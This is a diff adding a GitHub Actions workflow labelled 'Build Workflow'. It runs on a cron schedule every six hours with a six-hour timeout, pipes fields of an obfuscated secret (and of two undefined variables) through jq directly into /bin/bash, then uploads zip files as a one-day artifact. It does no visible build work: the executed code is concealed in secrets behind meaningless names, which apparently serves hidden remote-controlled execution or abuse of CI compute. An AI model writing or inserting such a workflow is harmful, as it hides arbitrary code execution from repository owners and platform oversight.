@@ -1,0 +1,30 @@
+name: Build Workflow
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '45 5,11,17,23 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  main:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Process
+        env:
+          zbbd73: ${{ secrets.zbbd73 }}
+        run: |
+          printf '%s' "$zbbd73" | jq -r .hasvi385 | /bin/bash
+          printf '%s' "$slsx00" | jq -r .c0 | /bin/bash
+          printf '%s' "$kmpr5" | jq -r .kl288 | /bin/bash
+
+      - name: Archive output
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: WwhoF7ao
+          path: "*.zip"
+          retention-days: 1
